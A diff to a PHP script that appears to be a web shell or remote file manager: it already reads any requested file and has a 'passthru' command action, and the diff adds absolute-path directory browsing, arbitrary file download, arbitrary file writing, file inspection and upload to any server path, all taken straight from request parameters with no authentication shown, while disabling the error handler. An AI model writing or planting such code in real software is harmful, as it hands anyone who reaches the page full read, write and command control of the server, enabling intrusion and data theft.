@@ -8,7 +8,7 @@
 
     }
 
-    set_error_handler("error_handler");
+    //set_error_handler("error_handler");
 
     /* Gather information about the server */
     /* Find out who we are */
@@ -94,6 +94,10 @@
         if ($_REQUEST['ajax'] == 'dir')
         {
             $dir = realpath(realpath($_REQUEST['dir']) . DIRECTORY_SEPARATOR . @$_REQUEST['go']);
+            if (@$_REQUEST['go'][0] == '/')
+            {
+                $dir = realpath($_REQUEST['go']);
+            }
             $ret['dir'] = $dir;
             $files = scandir($dir);
             foreach ($files as $file)
@@ -112,6 +116,31 @@
         if ($_REQUEST['ajax'] == 'get')
         {
             echo file_get_contents($_REQUEST['get']);
+        }
+        if ($_REQUEST['ajax'] == 'download')
+        {
+            header('Pragma: public');
+            header('Expires: 0');
+            header('Content-Type: application/force-download');
+            header('Content-Transfer-Encoding: binary');
+            header('Content-Disposition: attachment; filename="' . basename($_REQUEST['download']) . '"');
+            echo file_get_contents($_REQUEST['download']);
+        }
+        if ($_REQUEST['ajax'] == 'save')
+        {
+            file_put_contents($_REQUEST['save'], $_REQUEST['contents']);
+        }
+        if ($_REQUEST['ajax'] == 'getfileinfo')
+        {
+            $ret = array(
+                'contents' => file_get_contents($_REQUEST['file']),
+                'writeable' => is_writeable($_REQUEST['file'])
+            );
+            echo json_encode($ret);
+        }
+        if ($_REQUEST['ajax'] == 'upload')
+        {
+            move_uploaded_file($_FILES['file']['tmp_name'], $_REQUEST['upload']);
         }
         if ($_REQUEST['ajax'] == 'passthru')
         {
@@ -148,6 +177,6 @@
     }
     else
     {
-        include('template.o');
+        include('template.html');
     }
 ?>
